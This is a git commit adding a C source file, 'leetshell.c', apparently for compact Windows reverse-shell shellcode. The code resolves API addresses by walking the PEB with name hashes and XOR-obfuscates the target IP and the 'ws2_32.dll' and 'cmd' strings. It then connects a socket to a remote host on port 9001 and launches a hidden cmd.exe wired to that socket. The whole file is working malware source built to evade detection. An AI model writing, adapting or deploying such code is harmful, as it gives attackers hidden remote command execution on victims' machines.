98d6e74b2d7428f08b5a01d8bc8e2fc14328611f
jarednexgent <115313168+jarednexgent@users.noreply.github.com>
2025-07-18 18:00:05 -0600

    reduce shellcode size

---
+++ src/leetshell.c
@@ -0,0 +1,129 @@
+#include "structs.h"
+#include <stdio.h>
+#include <inttypes.h>
+
+#define LOADLIBRARYA_H 		1123600852
+#define CREATEPROCESSA_H 	1053195260
+#define WSASTARTUP_H    	1750926024
+#define WSASOCKETA_H    	2909215252
+#define HTONS_H        		2567088474   	 
+#define INET_ADDR_H    		578114214
+#define CONNECT_H       	3293380122
+
+#define KEY1 0xd6
+#define KEY2 0x5f
+#define KEY3 0xde
+
+#define MEMSET(buf, val, len) 	for (int i = 0; i < (len); i++) ((char*)(buf))[i] = (val)
+#define LEN(s) 					({ const char *_p = (s); while (*_p) _p++; _p - (s); })
+#define HTONS(x) 				( ( (( (USHORT)(x) ) >> 8 ) & 0xff) | ((( (USHORT)(x) ) & 0xff) << 8) )
+#define XOR(buf,k)				_xor_bytes(buf, k)
+
+
+#define LOSELOSE_HASH(s, hash) do {                   \
+    (hash) = 0;                                       \
+    const char *_p = (s);                             \
+    int _c;                                           \
+    while ((_c = (unsigned char)(*_p++))) {           \
+        (hash) += _c;                                 \
+        (hash) *= (_c + 3);                           \
+    }                                                 \
+} while (0)
+
+static unsigned char _xor(unsigned char x, unsigned char y) {
+    return (x | y) & ~(x & y);  // Equivalent to x ^ y
+}
+
+static void _xor_bytes(char* buf, unsigned char key) {
+    for (size_t i = 0; i < LEN(buf); i++) {
+        buf[i] = _xor(buf[i], key);
+    }
+}
+
+// Get Function Address via PEB Walk
+HMODULE GetFuncAddr(DWORD64 FuncHash) {    
+	PIMAGE_EXPORT_DIRECTORY ExportDir;
+	DWORD FuncNumber, Hash, i;    
+	PDWORD FuncNameBase;
+	PCSTR FuncName;
+	WORD OrdinalIndex;
+
+	PPEB PebAddress = (PPEB) __readgsqword( 0x60 ); // Access the PEB structure directly via GS:[0x60] on x64.
+	PPEB_LDR_DATA2 Ldr = (PPEB_LDR_DATA2) PebAddress->Ldr; // The PEB contains a pointer to PEB_LDR_DATA, which has a linked list of loaded modules.    
+	PLIST_ENTRY NextModule = Ldr->InLoadOrderModuleList.Flink; // This is the first module (usually the main EXE), and from here we walk the list.    
+	PLDR_DATA_TABLE_ENTRY2 DataTableEntry = (PLDR_DATA_TABLE_ENTRY2) NextModule;	 
+	while (DataTableEntry->DllBase != NULL) {    
+    	DWORD64 ModuleBase = (DWORD64)DataTableEntry->DllBase;	// Loop over all modules. DllBase is the base address of the module in memory.    
+    	PIMAGE_NT_HEADERS NTHeader = (PIMAGE_NT_HEADERS) ( ModuleBase + ((PIMAGE_DOS_HEADER) ModuleBase)->e_lfanew); // Locate NT headers using the PE structure (DOS header --> NT header).    
+    	DWORD ExportDirRVA = NTHeader->OptionalHeader.DataDirectory[0].VirtualAddress; // This retrieves the Export Directory from the module.
+    	DataTableEntry = (PLDR_DATA_TABLE_ENTRY2) DataTableEntry->InLoadOrderLinks.Flink; // Get the next loaded module entry (ntdll.dll --> kernel32.dll)
+    	if (ExportDirRVA == 0) {
+        	continue;
+    	}    
+    	ExportDir = (PIMAGE_EXPORT_DIRECTORY) ((DWORD64) ModuleBase + ExportDirRVA); // Get a pointer to the actual export directory table.
+    	FuncNumber = ExportDir->NumberOfNames;
+    	FuncNameBase = (PDWORD) ((PCHAR) ModuleBase + ExportDir->AddressOfNames);  // Extract names of all exported functions from the module.
+    	for (i = 0; i < FuncNumber; i++) {
+        	FuncName = (PCSTR) (*FuncNameBase + (DWORD64) ModuleBase);
+        	FuncNameBase++;    
+        	LOSELOSE_HASH(FuncName, Hash);    
+        	if (Hash == FuncHash) {	// For each function, hash its name and compare it to the input hash.                       	 
+            	OrdinalIndex = *(PWORD)(((DWORD64) ModuleBase + ExportDir->AddressOfNameOrdinals) + (2 * i));
+            	return (HMODULE) ((DWORD64) ModuleBase + *(PDWORD)(((DWORD64) ModuleBase + ExportDir->AddressOfFunctions) + (4 * OrdinalIndex))); // If matched, resolve function address using its ordinal --> RVA --> VA.                               	 
+        	}
+    	}
+	}
+	return NULL;
+}
+
+typedef HMODULE (WINAPI* LOADLIBRARYA)(LPCSTR);
+typedef BOOL (WINAPI* CREATEPROCESSA)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID , LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION);
+typedef int (WINAPI* WSASTARTUP)(WORD, LPWSADATA);
+typedef SOCKET (WINAPI* WSASOCKETA)(int, int, int, WSAPROTOCOL_INFOA*, DWORD, DWORD);
+typedef unsigned long (WINAPI* INET_ADDR)(const char*);
+typedef int (WINAPI* CONNECT)(SOCKET, struct sockaddr*, int);
+
+void rev() {
+    
+	int port = 9001 ;
+	char ip[] = {0xef,0xe7,0xec,0xf0,0xef,0xe8,0xe6,0xf0,0xec,0xf0,0xe6, 0xde};
+	
+	//   ws2_32.dll    0x77  0x73  0x32  0x5f  0x33  0x32  0x2e  0x64  0x6c  0x6c  key
+	char ws2_32_dll[] = {0xa1, 0xa5, 0xe4, 0x89, 0xe5, 0xe4, 0xf8, 0xb2, 0xba, 0xba, 0xd6};
+
+	// powershell 0x70, 0x6f, 0x77, 0x65, 0x72, 0x73, 0x68, 0x65, 0x6c, 0x6c,  key
+	//	 cmd	  0x63, 0xcd, 0x64, key
+	char cmd[] = {0x3c, 0x32, 0x3b, 0x5f};
+	
+	UINT64 pLoadLibraryA = (UINT64)GetFuncAddr(LOADLIBRARYA_H);	// Get function addresses 
+	UINT64 pCreateProcessA = (UINT64)GetFuncAddr(CREATEPROCESSA_H);   
+	XOR(ws2_32_dll, KEY1);
+	((LOADLIBRARYA)pLoadLibraryA)(ws2_32_dll);
+	UINT64 pWsaStartup = (UINT64)GetFuncAddr(WSASTARTUP_H);
+	UINT64 pWsaSocketA = (UINT64)GetFuncAddr(WSASOCKETA_H);
+	UINT64 pInet_addr = (UINT64)GetFuncAddr(INET_ADDR_H);
+	UINT64 pConnect = (UINT64)GetFuncAddr(CONNECT_H);
+
+	WSADATA wsadata; // winsock struct declarations
+	STARTUPINFO si;
+	PROCESS_INFORMATION pi;
+	struct sockaddr_in sa;
+	
+	((WSASTARTUP)pWsaStartup)(MAKEWORD(2, 2), &wsadata); // required before using winsock
+	SOCKET socket = ((WSASOCKETA)pWsaSocketA)(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0); // creates the socket
+	sa.sin_family = AF_INET;
+	sa.sin_port = HTONS(port);
+	XOR(ip, KEY3);
+	sa.sin_addr.s_addr = ((INET_ADDR)pInet_addr)(ip); // sets sa fields
+	((CONNECT)pConnect)(socket, (struct sockaddr*)&sa, sizeof(sa)); // perform the connection
+	size_t siLen = sizeof(si);
+	MEMSET(&si, 0 ,siLen); // fill in si (prep for CreateProcessA)
+	si.cb = siLen;
+	si.dwFlags = (STARTF_USESTDHANDLES);
+	si.hStdInput = (HANDLE)socket;
+	si.hStdOutput = (HANDLE)socket;
+	si.hStdError = (HANDLE)socket;
+	XOR(cmd, KEY2);
+	((CREATEPROCESSA)pCreateProcessA)(NULL, (LPSTR)cmd, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, (LPSTARTUPINFOA)&si, &pi); // launches shell bound for socket
+    
+}
